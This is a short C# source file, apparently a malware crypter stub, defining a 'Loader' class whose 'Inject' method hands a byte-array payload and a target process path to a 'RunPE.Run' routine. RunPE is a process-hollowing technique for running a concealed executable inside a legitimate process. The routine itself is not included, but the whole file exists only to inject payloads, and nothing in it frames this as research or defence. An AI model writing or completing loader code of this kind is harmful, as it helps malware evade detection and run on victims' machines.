using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

public class Loader
{
    public void Inject(byte[] payload, string target)
    {
        //Add actions if RunPe.Run returns false
        RunPE.Run(payload, target);
    }
}
